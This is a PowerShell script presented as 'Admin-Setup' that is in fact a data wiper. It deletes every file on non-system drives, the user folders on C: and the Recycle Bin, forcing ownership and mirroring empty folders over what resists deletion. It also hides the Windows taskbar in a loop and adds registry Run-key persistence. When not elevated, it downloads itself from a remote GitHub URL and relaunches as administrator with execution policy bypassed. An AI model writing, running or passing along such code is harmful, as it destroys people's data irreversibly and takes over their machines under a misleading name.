<#
.SYNOPSIS
  One script. Hide taskbar, two badges, then delete all files on other drives, then C: (not Windows), then Recycle Bin.
  Live wipe: -ConfirmPhrase WIPE-ALL-DATA
#>
[CmdletBinding()]
param(
  [ValidateSet('All','HideBar','Badges','Wipe')]
  [string]$Mode = 'All',
  [string]$ConfirmPhrase = ''
)
Set-StrictMode -Version 1
$ErrorActionPreference = 'Continue'
$ProgressPreference = 'SilentlyContinue'
try { [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 } catch {}
$script:AdminDir = Join-Path $env:USERPROFILE 'admin'
$script:Url = 'https://raw.githubusercontent.com/e24g4vewetq3gwerb/Admin-setup/main/Admin-Setup.ps1'
$script:Live = ($ConfirmPhrase -eq 'WIPE-ALL-DATA')
function Test-Admin {
  $id = [Security.Principal.WindowsIdentity]::GetCurrent()
  return (New-Object Security.Principal.WindowsPrincipal($id)).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}
function Get-Self {
  foreach ($c in @($PSCommandPath, $MyInvocation.MyCommand.Path)) {
    if ($c -and (Test-Path -LiteralPath $c)) { return $c }
  }
  return $null
}
function L([string]$m) {
  New-Item -ItemType Directory -Force -Path $script:AdminDir | Out-Null
  $line = '{0:yyyy-MM-dd HH:mm:ss} {1}' -f (Get-Date), $m
  Add-Content (Join-Path $script:AdminDir 'Admin-Setup.log') $line
  Write-Host $line
}
function Kill-Item([string]$Path) {
  if (-not $Path -or -not (Test-Path -LiteralPath $Path)) { return }
  L "DELETE $Path"
  if (-not $script:Live) { return }
  cmd /c "attrib -s -h -r `"$Path`" /s /d >nul 2>&1"
  cmd /c "takeown /F `"$Path`" /R /D Y >nul 2>&1"
  cmd /c "icacls `"$Path`" /grant *S-1-5-32-544:F /T /C /Q >nul 2>&1"
  cmd /c "del /f /s /q `"$Path`" >nul 2>&1"
  try { Remove-Item -LiteralPath $Path -Recurse -Force -ErrorAction SilentlyContinue } catch {}
  if (Test-Path -LiteralPath $Path -PathType Container) {
    $e = Join-Path $env:TEMP ('z' + [guid]::NewGuid().ToString('N'))
    New-Item -ItemType Directory -Force -Path $e | Out-Null
    cmd /c "robocopy `"$e`" `"$Path`" /MIR /R:0 /W:0 /NFL /NDL /NJH /NJS /MT:8 >nul"
    cmd /c "rd /s /q `"$Path`""
    Remove-Item $e -Force -ErrorAction SilentlyContinue
  }
  if (Test-Path -LiteralPath $Path) { L "LEFT $Path" } else { L "GONE $Path" }
}
function Clear-Root([string]$Root, [string[]]$KeepNames) {
  if (-not (Test-Path -LiteralPath $Root)) { L "MISSING $Root"; return }
  L "SELECT ALL $Root"
  Get-ChildItem -LiteralPath $Root -Force -ErrorAction SilentlyContinue | ForEach-Object {
    $n = $_.Name.ToLowerInvariant()
    if ($KeepNames -and ($KeepNames -contains $n)) { L "KEEP $($_.FullName)"; return }
    Kill-Item $_.FullName
  }
}
function Invoke-Wipe {
  $os = $env:SystemDrive.TrimEnd('\').TrimEnd(':')
  L "Wiping other drives first. live=$script:Live"
  Get-CimInstance Win32_LogicalDisk | Where-Object { $_.DriveType -in 2, 3, 6 } | ForEach-Object {
    $let = $_.DeviceID.TrimEnd(':')
    if ($let -eq $os) { return }
    $root = $let + ':\'
    L "OTHER $root"
    Clear-Root $root @()
  }
  L "Wiping C: last (keep Windows)"
  $keep = @('windows','boot','bootmgr','bootnxt','bootsect.bak','recovery','$winreagent','system volume information','pagefile.sys','hiberfil.sys','swapfile.sys')
  Get-ChildItem -LiteralPath ($os + ':\') -Force -ErrorAction SilentlyContinue | ForEach-Object {
    $n = $_.Name.ToLowerInvariant()
    if ($keep -contains $n) { L "KEEP $($_.FullName)"; return }
    if ($n -eq 'users') {
      Get-ChildItem $_.FullName -Force -Directory -ErrorAction SilentlyContinue | ForEach-Object {
        foreach ($f in @('Downloads','Documents','Desktop','Pictures','Videos','Music','OneDrive','3D Objects','Favorites')) {
          $p = Join-Path $_.FullName $f
          if (Test-Path -LiteralPath $p) { Clear-Root $p @() }
        }
      }
      return
    }
    Kill-Item $_.FullName
  }
  L 'Recycle Bin last'
  if ($script:Live) {
    try { Clear-RecycleBin -Force -ErrorAction SilentlyContinue } catch {}
    Get-CimInstance Win32_LogicalDisk | ForEach-Object {
      $rb = $_.DeviceID.TrimEnd(':') + ':\$Recycle.Bin'
      if (Test-Path -LiteralPath $rb) { Clear-Root $rb @() }
    }
  }
  L 'WIPE DONE'
}
function Start-HideBar {
  $m = New-Object System.Threading.Mutex($false, 'Local\AdminSetupHideTaskbar')
  if (-not $m.WaitOne(0, $false)) { return }
  Add-Type -TypeDefinition @'
using System; using System.Runtime.InteropServices;
public static class TrayHide {
  [DllImport("user32.dll", CharSet=CharSet.Auto)] public static extern IntPtr FindWindow(string a, string b);
  [DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr h, int n);
  [DllImport("user32.dll")] public static extern bool EnableWindow(IntPtr h, bool e);
  public static void Hide() {
    IntPtr x = FindWindow("Shell_TrayWnd", null); if (x != IntPtr.Zero) { ShowWindow(x,0); EnableWindow(x,false); }
    IntPtr y = FindWindow("Shell_SecondaryTrayWnd", null); if (y != IntPtr.Zero) { ShowWindow(y,0); EnableWindow(y,false); }
  }
}
'@
  while ($true) { try { [TrayHide]::Hide() } catch {}; Start-Sleep -Milliseconds 400 }
}
function Start-Badges {
  $m = New-Object System.Threading.Mutex($false, 'Local\AdminSetupFolderLogo')
  if (-not $m.WaitOne(0, $false)) { return }
  Add-Type -AssemblyName PresentationCore, PresentationFramework, WindowsBase, System.Drawing
  function ToBmp([System.Drawing.Image]$Img) {
    if (-not $Img) { return $null }
    $ms = New-Object System.IO.MemoryStream
    $Img.Save($ms, [System.Drawing.Imaging.ImageFormat]::Png); $ms.Position = 0
    $b = New-Object System.Windows.Media.Imaging.BitmapImage
    $b.BeginInit(); $b.CacheOption = [System.Windows.Media.Imaging.BitmapCacheOption]::OnLoad
    $b.StreamSource = $ms; $b.EndInit(); $b.Freeze(); $ms.Dispose(); return $b
  }
  function Ico([string]$p) { try { return ToBmp ([System.Drawing.Icon]::ExtractAssociatedIcon($p).ToBitmap()) } catch { return $null } }
  $xaml = @'
<Window xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation" WindowStyle="None" AllowsTransparency="True" Background="Transparent" ShowInTaskbar="False" Topmost="True" ResizeMode="NoResize" SizeToContent="WidthAndHeight">
  <StackPanel Orientation="Horizontal" Margin="8,8,8,10">
    <Grid Width="64" Height="64" Margin="0,0,18,0" Cursor="Hand" Name="BtnFolder">
      <Ellipse Fill="#FF2A2A2A" Stroke="#FFE6B422" StrokeThickness="2.2"/>
      <Image Name="ImgFolder" Width="30" Height="30"/>
    </Grid>
    <Grid Width="64" Height="64" Cursor="Hand" Name="BtnPs">
      <Ellipse Fill="#FF172233" Stroke="#FF3B9AE1" StrokeThickness="2.2"/>
      <Image Name="ImgPs" Width="30" Height="30"/>
    </Grid>
  </StackPanel>
</Window>
'@
  $w = [Windows.Markup.XamlReader]::Parse($xaml)
  $w.FindName('ImgFolder').Source = (Ico (Join-Path $env:SystemRoot 'explorer.exe'))
  $w.FindName('ImgPs').Source = (Ico (Join-Path $env:SystemRoot 'System32\WindowsPowerShell\v1.0\powershell.exe'))
  function Place { $w.Left = [Math]::Max(0, ([System.Windows.SystemParameters]::PrimaryScreenWidth - $w.ActualWidth) / 2); $w.Top = [System.Windows.SystemParameters]::PrimaryScreenHeight - $w.ActualHeight - 16 }
  $w.FindName('BtnFolder').Add_MouseLeftButtonUp({ Start-Process explorer.exe $env:USERPROFILE | Out-Null })
  $w.FindName('BtnPs').Add_MouseLeftButtonUp({ Start-Process (Join-Path $env:SystemRoot 'System32\WindowsPowerShell\v1.0\powershell.exe') | Out-Null })
  $w.Add_ContentRendered({ Place })
  $t = New-Object System.Windows.Threading.DispatcherTimer
  $t.Interval = [TimeSpan]::FromSeconds(3)
  $t.Add_Tick({ $w.Topmost = $true; Place })
  $t.Start()
  [void]$w.ShowDialog()
}

if ($Mode -eq 'HideBar') { Start-HideBar; return }
if ($Mode -eq 'Badges') { Start-Badges; return }

if (-not (Test-Admin)) {
  $self = Get-Self
  if (-not $self) {
    New-Item -ItemType Directory -Force -Path $script:AdminDir | Out-Null
    $self = Join-Path $script:AdminDir 'Admin-Setup.ps1'
    Invoke-WebRequest -UseBasicParsing -Uri $script:Url -OutFile $self
  }
  $arg = "-NoProfile -ExecutionPolicy Bypass -File `"$self`" -Mode $Mode"
  if ($script:Live) { $arg += ' -ConfirmPhrase WIPE-ALL-DATA' }
  Start-Process "$env:SystemRoot\System32\WindowsPowerShell\v1.0\powershell.exe" -Verb RunAs -ArgumentList $arg
  return
}

New-Item -ItemType Directory -Force -Path $script:AdminDir | Out-Null
$ps = "$env:SystemRoot\System32\WindowsPowerShell\v1.0\powershell.exe"
$self = Get-Self
if ($self) { Copy-Item $self (Join-Path $script:AdminDir 'Admin-Setup.ps1') -Force -ErrorAction SilentlyContinue }
$run = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'
New-Item $run -Force | Out-Null
New-ItemProperty $run -Name AdminSetupHideTaskbar -Value "`"$ps`" -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$($script:AdminDir)\Admin-Setup.ps1`" -Mode HideBar" -Force | Out-Null
New-ItemProperty $run -Name AdminSetupFolderLogo -Value "`"$ps`" -STA -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$($script:AdminDir)\Admin-Setup.ps1`" -Mode Badges" -Force | Out-Null
Start-Process $ps -WindowStyle Hidden -ArgumentList @('-NoProfile','-WindowStyle','Hidden','-ExecutionPolicy','Bypass','-File',(Join-Path $script:AdminDir 'Admin-Setup.ps1'),'-Mode','HideBar') | Out-Null
Start-Process $ps -WindowStyle Hidden -ArgumentList @('-STA','-NoProfile','-WindowStyle','Hidden','-ExecutionPolicy','Bypass','-File',(Join-Path $script:AdminDir 'Admin-Setup.ps1'),'-Mode','Badges') | Out-Null

if ($Mode -eq 'Wipe' -or $Mode -eq 'All') { Invoke-Wipe }
L 'DONE'
try { Start-Process notepad.exe (Join-Path $script:AdminDir 'Admin-Setup.log') } catch {}
